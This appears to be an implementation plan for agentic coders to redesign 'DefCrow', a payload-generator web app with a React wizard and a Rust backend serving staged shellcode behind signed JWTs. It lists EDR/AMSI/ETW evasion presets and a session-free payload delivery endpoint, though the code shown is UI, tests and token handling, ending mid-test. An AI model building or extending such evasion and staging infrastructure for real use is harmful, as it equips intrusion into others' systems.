# DefCrow UI Redesign + Staged Delivery Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Redesign the DefCrow frontend to a 5-step wizard with two-column layout and add a staged payload delivery backend with HMAC-SHA256 JWT authentication.

**Architecture:** New component tree — sticky `Header` with step rail, scrollable left `main-col` (wizard sections), sticky right `BuildConsole`. Backend gains `POST/GET/DELETE/LIST /api/v1/stage` with HMAC-SHA256 JWT for unauthenticated stage delivery.

**Tech Stack:** React 18 + TypeScript + Tailwind CSS + Vitest (frontend); Axum 0.7 + hmac + sha2 + base64 crates (backend).

---

## File Map

**New:**
- `frontend/src/hooks/useTheme.ts` — theme toggle (data-theme on html)
- `frontend/src/api/stage.ts` — stage HTTP client
- `frontend/src/components/Header.tsx` — logo + step rail + theme toggle
- `frontend/src/components/PayloadSection.tsx` — step 01: mode cards + upload
- `frontend/src/components/StageTransferSection.tsx` — step 02: JWT display
- `frontend/src/components/EvasionSection.tsx` — step 03: profiles + technique groups
- `frontend/src/components/OutputSection.tsx` — step 04: format grid
- `frontend/src/components/BuildConsole.tsx` — right col: log + forge button
- `frontend/src/components/DeliveryCard.tsx` — post-build: extension picker
- `frontend/src/pages/SettingsPage.tsx` — /settings page
- `web-server/src/api/stage.rs` — stage CRUD + JWT

**Modified:**
- `frontend/src/index.css` — CSS vars (--bg, --surface, --blue-500, etc.)
- `frontend/src/api/generate.ts` — add `Profile` type
- `frontend/src/pages/GeneratorPage.tsx` — complete rewrite
- `frontend/src/pages/LoginPage.tsx` — visual redesign
- `frontend/src/App.tsx` — add /settings route
- `web-server/Cargo.toml` — add hmac, sha2, base64 deps + axum multipart
- `web-server/src/state.rs` — add staged_key + staged_dir
- `web-server/src/api/mod.rs` — expose stage module
- `web-server/src/main.rs` — init staged dir, add stage routes

**Unchanged:** `loader-scaffold/`, `template-engine/`, `frontend/src/components/OpsecFeatures.tsx`

---

## Task 1: Design system CSS tokens

**Files:**
- Modify: `frontend/src/index.css`

- [ ] **Step 1: Replace index.css with design system tokens**

```css
@import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&family=JetBrains+Mono:wght@400;500&display=swap');

@tailwind base;
@tailwind components;
@tailwind utilities;

@layer base {
  :root,
  [data-theme="hacker"] {
    --bg:           #0a0a0f;
    --surface:      #12121a;
    --surface-2:    #1a1a26;
    --border:       #1e1e2e;
    --ink:          #e2e8f0;
    --ink-muted:    #64748b;
    --blue-500:     #7c3aed;
    --blue-alpha:   rgba(124, 58, 237, 0.15);
    --ok:           #22c55e;
    --warn:         #f59e0b;
    --danger:       #dc2626;
    color-scheme: dark;
  }
  [data-theme="clean"] {
    --bg:           #f5f7fb;
    --surface:      #ffffff;
    --surface-2:    #f0f2f8;
    --border:       #e2e8f0;
    --ink:          #0b1424;
    --ink-muted:    #64748b;
    --blue-500:     #2f6bff;
    --blue-alpha:   rgba(47, 107, 255, 0.15);
    --ok:           #16a34a;
    --warn:         #d97706;
    --danger:       #dc2626;
    color-scheme: light;
  }
  body {
    background-color: var(--bg);
    color: var(--ink);
    font-family: 'Inter', system-ui, sans-serif;
  }
  code, pre, .font-mono {
    font-family: 'JetBrains Mono', 'Courier New', monospace;
  }
}
```

- [ ] **Step 2: Verify Tailwind builds without errors**

```bash
cd frontend && npm run build 2>&1 | head -20
```

Expected: No CSS errors. Build may fail on TS (that's OK at this stage).

- [ ] **Step 3: Commit**

```bash
git add frontend/src/index.css
git commit -m "feat: add design system CSS variables and Google Fonts"
```

---

## Task 2: useTheme hook

**Files:**
- Create: `frontend/src/hooks/useTheme.ts`
- Create: `frontend/src/hooks/__tests__/useTheme.test.ts`

- [ ] **Step 1: Write failing test**

Create `frontend/src/hooks/__tests__/useTheme.test.ts`:

```typescript
import { describe, it, expect, beforeEach } from 'vitest'
import { renderHook, act } from '@testing-library/react'
import { useTheme } from '../useTheme'

describe('useTheme', () => {
  beforeEach(() => {
    document.documentElement.removeAttribute('data-theme')
  })

  it('defaults to hacker theme', () => {
    const { result } = renderHook(() => useTheme())
    expect(result.current.theme).toBe('hacker')
  })

  it('sets data-theme attribute on html element', () => {
    const { result } = renderHook(() => useTheme())
    act(() => result.current.setTheme('clean'))
    expect(document.documentElement.getAttribute('data-theme')).toBe('clean')
    expect(result.current.theme).toBe('clean')
  })

  it('persists theme in localStorage', () => {
    const { result } = renderHook(() => useTheme())
    act(() => result.current.setTheme('clean'))
    expect(localStorage.getItem('defcrow_theme')).toBe('clean')
  })
})
```

- [ ] **Step 2: Run test to verify it fails**

```bash
cd frontend && npm test -- hooks/__tests__/useTheme 2>&1 | tail -10
```

Expected: FAIL — `useTheme` not found.

- [ ] **Step 3: Implement useTheme hook**

Create `frontend/src/hooks/useTheme.ts`:

```typescript
import { useState, useEffect } from 'react'

export type Theme = 'hacker' | 'clean'

export function useTheme() {
  const [theme, setThemeState] = useState<Theme>(
    () => (localStorage.getItem('defcrow_theme') as Theme) ?? 'hacker'
  )

  useEffect(() => {
    document.documentElement.setAttribute('data-theme', theme)
  }, [theme])

  function setTheme(t: Theme) {
    localStorage.setItem('defcrow_theme', t)
    setThemeState(t)
  }

  return { theme, setTheme }
}
```

- [ ] **Step 4: Run test to verify it passes**

```bash
cd frontend && npm test -- hooks/__tests__/useTheme 2>&1 | tail -5
```

Expected: PASS (3 tests).

- [ ] **Step 5: Commit**

```bash
git add frontend/src/hooks/useTheme.ts frontend/src/hooks/__tests__/useTheme.test.ts
git commit -m "feat: add useTheme hook with localStorage persistence"
```

---

## Task 3: Frontend API types + stage client

**Files:**
- Modify: `frontend/src/api/generate.ts` (add Profile type, lines 1-7)
- Create: `frontend/src/api/stage.ts`
- Create: `frontend/src/api/__tests__/stage.test.ts`

- [ ] **Step 1: Add Profile type to generate.ts**

Add after line 7 (`export type Encryption = 'Aes256' | 'Chacha20'`):

```typescript
export type Profile = 'stealth' | 'balanced' | 'aggressive'

export const PROFILE_FEATURES: Record<Profile, Feature[]> = {
  stealth:    ['DirectSyscall', 'UnhookKnownDlls', 'ModuleStomp', 'PpidSpoof', 'SleepEncrypt', 'StackSpoof', 'AmsiHwbp', 'EtwHwbp'],
  balanced:   ['DirectSyscall', 'SleepEncrypt', 'AmsiHwbp', 'EtwHwbp'],
  aggressive: ['AmsiHwbp'],
}

export const PROFILE_ENCRYPTION: Record<Profile, Encryption> = {
  stealth:    'Aes256',
  balanced:   'Chacha20',
  aggressive: 'Aes256',
}
```

- [ ] **Step 2: Write failing tests for stage.ts**

Create `frontend/src/api/__tests__/stage.test.ts`:

```typescript
import { describe, it, expect, vi, beforeEach } from 'vitest'
import * as clientModule from '../client'

vi.mock('../client', () => ({
  client: {
    post:   vi.fn(),
    get:    vi.fn(),
    delete: vi.fn(),
  },
}))

const mockedClient = clientModule.client as any

describe('stage API', () => {
  beforeEach(() => vi.clearAllMocks())

  it('uploadStage posts to /v1/stage with FormData', async () => {
    mockedClient.post.mockResolvedValue({ data: { pid: 'abc123', size: 512, name: 'payload.bin', jwt: 'x.y.z', url: '/api/v1/stage/abc123' } })
    const { uploadStage } = await import('../stage')
    const file = new File([new Uint8Array(512)], 'payload.bin')
    const res = await uploadStage(file)
    expect(mockedClient.post).toHaveBeenCalledWith('/v1/stage', expect.any(FormData), expect.objectContaining({ headers: expect.any(Object) }))
    expect(res.pid).toBe('abc123')
  })

  it('listStages calls GET /v1/stage', async () => {
    mockedClient.get.mockResolvedValue({ data: [] })
    const { listStages } = await import('../stage')
    await listStages()
    expect(mockedClient.get).toHaveBeenCalledWith('/v1/stage')
  })

  it('deleteStage calls DELETE /v1/stage/:pid', async () => {
    mockedClient.delete.mockResolvedValue({})
    const { deleteStage } = await import('../stage')
    await deleteStage('abc123')
    expect(mockedClient.delete).toHaveBeenCalledWith('/v1/stage/abc123')
  })

  it('rotateToken posts to /v1/stage/:pid/token', async () => {
    mockedClient.post.mockResolvedValue({ data: { jwt: 'new.jwt.token' } })
    const { rotateToken } = await import('../stage')
    const res = await rotateToken('abc123')
    expect(mockedClient.post).toHaveBeenCalledWith('/v1/stage/abc123/token', undefined, undefined)
    expect(res.jwt).toBe('new.jwt.token')
  })
})
```

- [ ] **Step 3: Run tests to verify they fail**

```bash
cd frontend && npm test -- api/__tests__/stage 2>&1 | tail -10
```

Expected: FAIL — `stage.ts` not found.

- [ ] **Step 4: Implement stage.ts**

Create `frontend/src/api/stage.ts`:

```typescript
import { client } from './client'

export interface StagePayload {
  pid:        string
  name:       string
  size:       number
  arch:       string
  created_at: string
}

export interface StageUploadResponse {
  pid:  string
  size: number
  name: string
  jwt:  string
  url:  string
}

export async function uploadStage(file: File): Promise<StageUploadResponse> {
  const form = new FormData()
  form.append('file', file)
  const { data } = await client.post<StageUploadResponse>('/v1/stage', form, {
    headers: { 'Content-Type': 'multipart/form-data' },
  })
  return data
}

export async function listStages(): Promise<StagePayload[]> {
  const { data } = await client.get<StagePayload[]>('/v1/stage')
  return data
}

export async function deleteStage(pid: string): Promise<void> {
  await client.delete(`/v1/stage/${pid}`)
}

export async function rotateToken(pid: string): Promise<{ jwt: string }> {
  const { data } = await client.post<{ jwt: string }>(`/v1/stage/${pid}/token`, undefined, undefined)
  return data
}
```

- [ ] **Step 5: Run tests to verify they pass**

```bash
cd frontend && npm test -- api/__tests__/stage 2>&1 | tail -5
```

Expected: PASS (4 tests).

- [ ] **Step 6: Commit**

```bash
git add frontend/src/api/generate.ts frontend/src/api/stage.ts frontend/src/api/__tests__/stage.test.ts
git commit -m "feat: add Profile type and staged payload API client"
```

---

## Task 4: Backend — Cargo.toml + AppState

**Files:**
- Modify: `web-server/Cargo.toml`
- Modify: `web-server/src/state.rs`

- [ ] **Step 1: Add dependencies to Cargo.toml**

In the `[dependencies]` section, add:

```toml
hmac    = "0.12"
sha2    = "0.10"
base64  = "0.21"
```

Also update the axum line to add `"multipart"` feature:

```toml
axum = { version = "0.7", features = ["ws", "macros", "multipart"] }
```

- [ ] **Step 2: Update AppState**

Replace the contents of `web-server/src/state.rs`:

```rust
use std::path::PathBuf;
use crate::{builder::job_store::JobStore, config::Config, middleware::auth::{LoginRateLimiter, SessionStore}};

#[derive(Clone)]
pub struct AppState {
    pub config:           Config,
    pub sessions:         SessionStore,
    pub jobs:             JobStore,
    pub rate_limiter:     LoginRateLimiter,
    pub generate_limiter: LoginRateLimiter,
    pub staged_key:       [u8; 32],
    pub staged_dir:       PathBuf,
}
```

- [ ] **Step 3: Run existing tests to verify nothing breaks**

```bash
cd web-server && cargo test 2>&1 | tail -15
```

Expected: existing tests pass (staged_key and staged_dir are new fields, main.rs initializes them in the next task).

Note: `main.rs` will fail to compile until Task 6 adds the new fields to AppState init. The library tests (not main.rs) should still pass. If compile fails due to main.rs, skip this step and run after Task 6.

- [ ] **Step 4: Commit**

```bash
git add web-server/Cargo.toml web-server/src/state.rs
git commit -m "feat: add hmac/sha2/base64 deps and staged_key/staged_dir to AppState"
```

---

## Task 5: Backend — stage.rs CRUD routes + JWT

**Files:**
- Create: `web-server/src/api/stage.rs`
- Modify: `web-server/src/api/mod.rs`

- [ ] **Step 1: Write failing tests for JWT functions**

Add to `web-server/src/api/stage.rs` (create the file with tests at top under `#[cfg(test)]`):

```rust
#[cfg(test)]
mod tests {
    use super::*;

    fn test_key() -> [u8; 32] {
        [0x42u8; 32]
    }

    #[test]
    fn sign_then_verify_roundtrip() {
        let key = test_key();
        let claims = StageClaims {
            pid: "abc123".into(),
            sz: 512,
            iat: 1700000000,
            exp: 1700003600,
            nonce: "deadbeef01234567".into(),
        };
        let token = sign_jwt(&key, &claims);
        let parts: Vec<&str> = token.splitn(3, '.').collect();
        assert_eq!(parts.len(), 3, "JWT must have 3 parts");
        let decoded = verify_jwt(&key, &token).expect("should verify");
        assert_eq!(decoded.pid, "abc123");
        assert_eq!(decoded.sz, 512);
    }

    #[test]
    fn tampered_token_fails_verify() {
        let key = test_key();
        let claims = StageClaims { pid: "x".into(), sz: 1, iat: 0, exp: 9999999999, nonce: "n".into() };
        let mut token = sign_jwt(&key, &claims);
        token.push('x');
        assert!(verify_jwt(&key, &token).is_none());
    }

    #[test]
    fn wrong_key_fails_verify() {
        let key1 = [0x11u8; 32];
        let key2 = [0x22u8; 32];
        let claims = StageClaims { pid: "y".into(), sz: 2, iat: 0, exp: 9999999999, nonce: "n".into() };
        let token = sign_jwt(&key1, &claims);
        assert!(verify_jwt(&key2, &token).is_none());
    }
}
```

- [ ] **Step 2: Run tests to verify they fail**

```bash
cd web-server && cargo test stage 2>&1 | tail -10
```

Expected: compile error — types not defined.

- [ ] **Step 3: Implement stage.rs**

Create `web-server/src/api/stage.rs` with full content:

```rust
use std::time::{SystemTime, UNIX_EPOCH};
use axum::{
    extract::{Multipart, Path, State},
    http::{HeaderMap, StatusCode},
    response::{IntoResponse, Response},
    Json,
};
use base64::{engine::general_purpose::URL_SAFE_NO_PAD, Engine};
use hmac::{Hmac, Mac};
use rand::Rng;
use serde::{Deserialize, Serialize};
use sha2::{Digest, Sha256};
use crate::state::AppState;

type HmacSha256 = Hmac<sha2::Sha256>;

// ── JWT ──────────────────────────────────────────────────────────────────────

#[derive(Serialize, Deserialize, Clone)]
pub struct StageClaims {
    pub pid:   String,
    pub sz:    usize,
    pub iat:   i64,
    pub exp:   i64,
    pub nonce: String,
}

pub fn sign_jwt(key: &[u8; 32], claims: &StageClaims) -> String {
    let header  = URL_SAFE_NO_PAD.encode(r#"{"alg":"HS256","typ":"JWT"}"#);
    let payload = URL_SAFE_NO_PAD.encode(serde_json::to_string(claims).unwrap());
    let data    = format!("{}.{}", header, payload);
    let mut mac = HmacSha256::new_from_slice(key).unwrap();
    mac.update(data.as_bytes());
    let sig = URL_SAFE_NO_PAD.encode(mac.finalize().into_bytes());
    format!("{}.{}.{}", header, payload, sig)
}

pub fn verify_jwt(key: &[u8; 32], token: &str) -> Option<StageClaims> {
    let mut parts = token.splitn(3, '.');
    let header  = parts.next()?;
    let payload = parts.next()?;
    let sig     = parts.next()?;
    let data = format!("{}.{}", header, payload);
    let mut mac = HmacSha256::new_from_slice(key).unwrap();
    mac.update(data.as_bytes());
    let expected = URL_SAFE_NO_PAD.encode(mac.finalize().into_bytes());
    if expected != sig { return None; }
    let raw = URL_SAFE_NO_PAD.decode(payload).ok()?;
    serde_json::from_slice(&raw).ok()
}

// ── Metadata ─────────────────────────────────────────────────────────────────

#[derive(Serialize, Deserialize, Clone)]
pub struct StageMeta {
    pub pid:        String,
    pub name:       String,
    pub size:       usize,
    pub arch:       String,
    pub created_at: String,
}

// ── POST /api/v1/stage ────────────────────────────────────────────────────────

#[derive(Serialize)]
pub struct UploadResponse {
    pub pid:  String,
    pub size: usize,
    pub name: String,
    pub jwt:  String,
    pub url:  String,
}

pub async fn upload_stage(
    State(state): State<AppState>,
    mut multipart: Multipart,
) -> Result<Json<UploadResponse>, (StatusCode, String)> {
    let mut file_bytes: Option<Vec<u8>> = None;
    let mut file_name = "payload.bin".to_string();

    while let Some(field) = multipart.next_field().await.map_err(|e| (StatusCode::BAD_REQUEST, e.to_string()))? {
        if field.name() == Some("file") {
            file_name = field.file_name().unwrap_or("payload.bin").to_string();
            file_bytes = Some(field.bytes().await.map_err(|e| (StatusCode::BAD_REQUEST, e.to_string()))?.to_vec());
        }
    }

    let bytes = file_bytes.ok_or((StatusCode::BAD_REQUEST, "missing file field".into()))?;
    let size  = bytes.len();

    let mut hasher = Sha256::new();
    hasher.update(&bytes);
    let hash = hasher.finalize();
    let pid: String = hash.iter().take(8).map(|b| format!("{:02x}", b)).collect();

    tokio::fs::create_dir_all(&state.staged_dir)
        .await
        .map_err(|e| (StatusCode::INTERNAL_SERVER_ERROR, e.to_string()))?;

    let bin_path  = state.staged_dir.join(format!("{}.bin", pid));
    let meta_path = state.staged_dir.join(format!("{}.json", pid));

    tokio::fs::write(&bin_path, &bytes)
        .await
        .map_err(|e| (StatusCode::INTERNAL_SERVER_ERROR, e.to_string()))?;

    let now = SystemTime::now().duration_since(UNIX_EPOCH).unwrap().as_secs() as i64;
    let meta = StageMeta {
        pid:        pid.clone(),
        name:       file_name.clone(),
        size,
        arch:       "x64".into(),
        created_at: now.to_string(),
    };
    tokio::fs::write(&meta_path, serde_json::to_string(&meta).unwrap())
        .await
        .map_err(|e| (StatusCode::INTERNAL_SERVER_ERROR, e.to_string()))?;

    let nonce: String = rand::thread_rng().gen::<[u8; 8]>().iter().map(|b| format!("{:02x}", b)).collect();
    let claims = StageClaims { pid: pid.clone(), sz: size, iat: now, exp: now + 3600, nonce };
    let jwt = sign_jwt(&state.staged_key, &claims);
    let url = format!("/api/v1/stage/{}", pid);

    Ok(Json(UploadResponse { pid, size, name: file_name, jwt, url }))
}

// ── GET /api/v1/stage/:pid ────────────────────────────────────────────────────

pub async fn fetch_stage(
    State(state): State<AppState>,
    Path(pid): Path<String>,
    headers: HeaderMap,
) -> Response {
    let token = match headers.get("authorization")
        .and_then(|v| v.to_str().ok())
        .and_then(|v| v.strip_prefix("Bearer "))
    {
        Some(t) => t.to_string(),
        None    => return (StatusCode::UNAUTHORIZED, "missing Bearer token").into_response(),
    };

    let claims = match verify_jwt(&state.staged_key, &token) {
        Some(c) => c,
        None    => return (StatusCode::UNAUTHORIZED, "invalid token").into_response(),
    };

    let now = SystemTime::now().duration_since(UNIX_EPOCH).unwrap().as_secs() as i64;
    if claims.exp < now {
        return (StatusCode::UNAUTHORIZED, "token expired").into_response();
    }

    if claims.pid != pid {
        return (StatusCode::FORBIDDEN, "pid mismatch").into_response();
    }

    let bin_path = state.staged_dir.join(format!("{}.bin", pid));
    match tokio::fs::read(&bin_path).await {
        Ok(bytes) => (
            [(axum::http::header::CONTENT_TYPE, "application/octet-stream")],
            bytes,
        ).into_response(),
        Err(_) => (StatusCode::NOT_FOUND, "stage not found").into_response(),
    }
}

// ── DELETE /api/v1/stage/:pid ─────────────────────────────────────────────────

pub async fn delete_stage(
    State(state): State<AppState>,
    Path(pid): Path<String>,
) -> StatusCode {
    let bin_path  = state.staged_dir.join(format!("{}.bin", pid));
    let meta_path = state.staged_dir.join(format!("{}.json", pid));
    let _ = tokio::fs::remove_file(&bin_path).await;
    let _ = tokio::fs::remove_file(&meta_path).await;
    StatusCode::NO_CONTENT
}

// ── GET /api/v1/stage ─────────────────────────────────────────────────────────

pub async fn list_stages(State(state): State<AppState>) -> Json<Vec<StageMeta>> {
    let mut result = Vec::new();
    if let Ok(mut dir) = tokio::fs::read_dir(&state.staged_dir).await {
        while let Ok(Some(entry)) = dir.next_entry().await {
            let path = entry.path();
            if path.extension().and_then(|e| e.to_str()) == Some("json") {
                if let Ok(raw) = tokio::fs::read_to_string(&path).await {
                    if let Ok(meta) = serde_json::from_str::<StageMeta>(&raw) {
                        result.push(meta);
                    }
                }
            }
        }
    }
    Json(result)
}

// ── POST /api/v1/stage/:pid/token ─────────────────────────────────────────────

#[derive(Serialize)]
pub struct TokenResponse { pub jwt: String }

pub async fn rotate_token(
    State(state): State<AppState>,
    Path(pid): Path<String>,
) -> Result<Json<TokenResponse>, StatusCode> {
    let meta_path = state.staged_dir.join(format!("{}.json", pid));
    let raw = tokio::fs::read_to_string(&meta_path).await.map_err(|_| StatusCode::NOT_FOUND)?;
    let meta: StageMeta = serde_json::from_str(&raw).map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
    let now   = SystemTime::now().duration_since(UNIX_EPOCH).unwrap().as_secs() as i64;
    let nonce: String = rand::thread_rng().gen::<[u8; 8]>().iter().map(|b| format!("{:02x}", b)).collect();
    let claims = StageClaims { pid: pid.clone(), sz: meta.size, iat: now, exp: now + 3600, nonce };
    let jwt = sign_jwt(&state.staged_key, &claims);
    Ok(Json(TokenResponse { jwt }))
}

#[cfg(test)]
mod tests {
    use super::*;

    fn test_key() -> [u8; 32] { [0x42u8; 32] }

    #[test]
    fn sign_then_verify_roundtrip() {
        let key = test_key();
        let claims = StageClaims { pid: "abc123".into(), sz: 512, iat: 1700000000, exp: 1700003600, nonce: "deadbeef01234567".into() };
        let token = sign_jwt(&key, &claims);
        assert_eq!(token.splitn(3, '.').count(), 3);
        let decoded = verify_jwt(&key, &token).expect("should verify");
        assert_eq!(decoded.pid, "abc123");
        assert_eq!(decoded.sz, 512);
    }

    #[test]
    fn tampered_token_fails_verify() {
        let key = test_key();
        let claims = StageClaims { pid: "x".into(), sz: 1, iat: 0, exp: 9999999999, nonce: "n".into() };
        let mut token = sign_jwt(&key, &claims);
        token.push('x');
        assert!(verify_jwt(&key, &token).is_none());
    }

    #[test]
    fn wrong_key_fails_verify() {
        let key1 = [0x11u8; 32];
        let key2 = [0x22u8; 32];
        let claims = StageClaims { pid: "y".into(), sz: 2, iat: 0, exp: 9999999999, nonce: "n".into() };
        let token = sign_jwt(&key1, &claims);
        assert!(verify_jwt(&key2, &token).is_none());
    }
}
```

- [ ] **Step 4: Add stage module to api/mod.rs**

Replace `web-server/src/api/mod.rs`:

```rust
pub mod auth;
pub mod cleanup;
pub mod generate;
pub mod jobs;
pub mod download;
pub mod stage;
```

- [ ] **Step 5: Run JWT unit tests**

```bash
cd web-server && cargo test stage::tests 2>&1 | tail -15
```

Expected: 3 tests pass (`sign_then_verify_roundtrip`, `tampered_token_fails_verify`, `wrong_key_fails_verify`).

- [ ] **Step 6: Commit**

```bash
git add web-server/src/api/stage.rs web-server/src/api/mod.rs
git commit -m "feat: add stage CRUD routes and HMAC-SHA256 JWT sign/verify"
```

---

## Task 6: Backend — wire stage routes into main.rs

**Files:**
- Modify: `web-server/src/main.rs`

- [ ] **Step 1: Update main.rs**

Replace `web-server/src/main.rs` with:

```rust
use web_server::{api, builder, config, middleware, state, ws};
use axum::{middleware as axum_mw, routing::{delete, get, post}, Router};
use tower_http::{cors::CorsLayer, services::ServeDir};
use tracing_subscriber::EnvFilter;
use rand::Rng;
use std::path::PathBuf;

use builder::{job_store::JobStore, scaffold::build_scaffold_rlib};
use config::Config;
use middleware::auth::{LoginRateLimiter, require_auth, SessionStore};
use state::AppState;

pub fn build_router(state: AppState) -> Router {
    let stage_authed = Router::new()
        .route("/api/v1/stage",           post(api::stage::upload_stage))
        .route("/api/v1/stage",           get(api::stage::list_stages))
        .route("/api/v1/stage/:pid",      delete(api::stage::delete_stage))
        .route("/api/v1/stage/:pid/token", post(api::stage::rotate_token))
        .route_layer(axum_mw::from_fn_with_state(state.clone(), require_auth));

    let protected = Router::new()
        .route("/api/generate",        post(api::generate::generate))
        .route("/api/jobs/:id",        get(api::jobs::get_job_status))
        .route("/api/jobs/:id",        delete(api::jobs::delete_job))
        .route("/api/download/:id",    get(api::download::download_artifact))
        .route_layer(axum_mw::from_fn_with_state(state.clone(), require_auth));

    Router::new()
        .route("/api/auth/login",  post(api::auth::login))
        .route("/api/auth/logout", post(api::auth::logout))
        .route("/api/health",      get(|| async { "ok" }))
        .route("/ws/jobs/:id",     get(ws::progress::ws_job_progress))
        // Stage fetch (Bearer JWT — no session required)
        .route("/api/v1/stage/:pid", get(api::stage::fetch_stage))
        .merge(stage_authed)
        .merge(protected)
        .fallback_service(ServeDir::new("frontend/dist"))
        .with_state(state)
        .layer(CorsLayer::permissive())
}

#[tokio::main]
async fn main() {
    tracing_subscriber::fmt()
        .with_env_filter(EnvFilter::from_default_env())
        .init();

    let mut cfg = Config::from_env().expect("failed to load config");

    let workspace = std::env::var("DEFCROW_WORKSPACE").unwrap_or_else(|_| ".".into());
    let rlib = build_scaffold_rlib(&workspace).expect("failed to build libscaffold.rlib");
    cfg.scaffold_rlib = rlib;

    let staged_dir = PathBuf::from(&cfg.artifacts_dir).join("staged");
    std::fs::create_dir_all(&staged_dir).expect("failed to create staged dir");

    let staged_key: [u8; 32] = rand::thread_rng().gen();

    let state = AppState {
        config:           cfg.clone(),
        sessions:         SessionStore::new(),
        jobs:             JobStore::new(),
        rate_limiter:     LoginRateLimiter::new(5, 60),
        generate_limiter: LoginRateLimiter::new(20, 60),
        staged_key,
        staged_dir,
    };

    web_server::api::cleanup::spawn_cleanup_task(cfg.artifacts_dir.clone());

    let addr = format!("0.0.0.0:{}", cfg.port);
    let app  = build_router(state);

    tracing::info!("DefCrow server listening on {}", addr);
    let listener = tokio::net::TcpListener::bind(&addr).await.unwrap();
    axum::serve(listener, app).await.unwrap();
}
```

- [ ] **Step 2: Run all backend tests**

```bash
cd web-server && cargo test 2>&1 | tail -20
```

Expected: all existing tests pass, plus 3 new JWT tests.

- [ ] **Step 3: Commit**

```bash
git add web-server/src/main.rs
git commit -m "feat: wire stage routes into axum router with session + JWT auth"
```

---

## Task 7: Header component

**Files:**
- Create: `frontend/src/components/Header.tsx`
- Create: `frontend/src/components/__tests__/Header.test.tsx`

- [ ] **Step 1: Write failing tests**

Create `frontend/src/components/__tests__/Header.test.tsx`:

```tsx
import { render, screen, fireEvent } from '@testing-library/react'
import { describe, it, expect, vi } from 'vitest'
import React from 'react'
import { MemoryRouter } from 'react-router-dom'
import { AuthProvider } from '../../store/auth'
import Header from '../Header'

const Wrapper = ({ children }: { children: React.ReactNode }) =>
  React.createElement(MemoryRouter, null, React.createElement(AuthProvider, null, children))

describe('Header', () => {
  it('renders DefCrow brand name', () => {
    render(
      React.createElement(Header, { currentStep: 1, showStageTransfer: false, onStepClick: vi.fn() }),
      { wrapper: Wrapper }
    )
    expect(screen.getByText('DefCrow')).toBeInTheDocument()
  })

  it('renders 4 step buttons when showStageTransfer is false', () => {
    render(
      React.createElement(Header, { currentStep: 1, showStageTransfer: false, onStepClick: vi.fn() }),
      { wrapper: Wrapper }
    )
    const steps = screen.getAllByRole('button').filter(b => b.textContent?.includes('0'))
    expect(steps).toHaveLength(4)
  })

  it('renders 5 step buttons when showStageTransfer is true', () => {
    render(
      React.createElement(Header, { currentStep: 1, showStageTransfer: true, onStepClick: vi.fn() }),
      { wrapper: Wrapper }
    )
    const steps = screen.getAllByRole('button').filter(b => b.textContent?.includes('0'))
    expect(steps).toHaveLength(5)
  })

  it('calls onStepClick with step id when step button is clicked', () => {
    const onStepClick = vi.fn()
    render(
      React.createElement(Header, { currentStep: 1, showStageTransfer: false, onStepClick }),
      { wrapper: Wrapper }
    )
    fireEvent.click(screen.getByText(/03 Evasion/))
    expect(onStepClick).toHaveBeenCalledWith(3)
  })
})
```

- [ ] **Step 2: Run tests to verify they fail**

```bash
cd frontend && npm test -- components/__tests__/Header 2>&1 | tail -10
```

- [ ] **Step 3: Implement Header.tsx**

Create `frontend/src/components/Header.tsx`:

```tsx
import { useAuth } from '../store/auth'
import { useTheme } from '../hooks/useTheme'

export type StepId = 1 | 2 | 3 | 4 | 5

interface StepDef { id: StepId; label: string; staged?: boolean }

const STEPS: StepDef[] = [
  { id: 1, label: '01 Payload' },
  { id: 2, label: '02 Stage Transfer', staged: true },
  { id: 3, label: '03 Evasion' },
  { id: 4, label: '04 Output' },
  { id: 5, label: '05 Forge' },
]

interface Props {
  currentStep: StepId
  showStageTransfer: boolean
  onStepClick: (step: StepId) => void
}

export default function Header({ currentStep, showStageTransfer, onStepClick }: Props) {
  const { logout }    = useAuth()
  const { theme, setTheme } = useTheme()

  const visible = STEPS.filter(s => !s.staged || showStageTransfer)

  return (
    <header
      className="sticky top-0 z-20 flex items-center gap-4 px-6"
      style={{ height: 60, borderBottom: '1px solid var(--border)', backgroundColor: 'var(--surface)' }}
    >
      {/* Brand */}
      <div className="flex items-center gap-2 shrink-0 w-48">
        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="var(--blue-500)" strokeWidth="2">
          <path d="M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5"/>
        </svg>
        <span className="font-semibold text-sm" style={{ color: 'var(--ink)' }}>DefCrow</span>
      </div>

      {/* Step rail */}
      <nav className="flex-1 flex justify-center gap-1" aria-label="wizard steps">
        {visible.map(step => {
          const active = currentStep === step.id
          return (
            <button
              key={step.id}
              type="button"
              onClick={() => onStepClick(step.id)}
              className="text-xs px-3 py-1.5 rounded-lg font-medium transition"
              style={{
                border: `1px solid ${active ? 'var(--blue-500)' : 'transparent'}`,
                backgroundColor: active ? 'var(--blue-alpha)' : 'transparent',
                color: active ? 'var(--blue-500)' : 'var(--ink-muted)',
              }}
            >
              {step.label}
            </button>
          )
        })}
      </nav>

      {/* Theme + sign out */}
      <div className="flex items-center gap-3 shrink-0 w-48 justify-end">
        <button
          type="button"
          onClick={() => setTheme(theme === 'hacker' ? 'clean' : 'hacker')}
          className="text-xs px-2 py-1 rounded-lg transition"
          style={{ border: '1px solid var(--border)', color: 'var(--ink-muted)' }}
        >
          {theme === 'hacker' ? 'Clean' : 'Hacker'}
        </button>
        <button type="button" onClick={logout} className="text-xs" style={{ color: 'var(--ink-muted)' }}>
          Sign out
        </button>
      </div>
    </header>
  )
}
```

- [ ] **Step 4: Run tests**

```bash
cd frontend && npm test -- components/__tests__/Header 2>&1 | tail -5
```

Expected: PASS (4 tests).

- [ ] **Step 5: Commit**

```bash
git add frontend/src/components/Header.tsx frontend/src/components/__tests__/Header.test.tsx
git commit -m "feat: add Header component with step rail and theme toggle"
```

---

## Task 8: PayloadSection component

**Files:**
- Create: `frontend/src/components/PayloadSection.tsx`
- Create: `frontend/src/components/__tests__/PayloadSection.test.tsx`

- [ ] **Step 1: Write failing tests**

Create `frontend/src/components/__tests__/PayloadSection.test.tsx`:

```tsx
import { render, screen, fireEvent } from '@testing-library/react'
import { describe, it, expect, vi } from 'vitest'
import React from 'react'
import PayloadSection from '../PayloadSection'

const defaultProps = {
  mode: 'stageless' as const,
  onModeChange: vi.fn(),
  shellcodeHex: '',
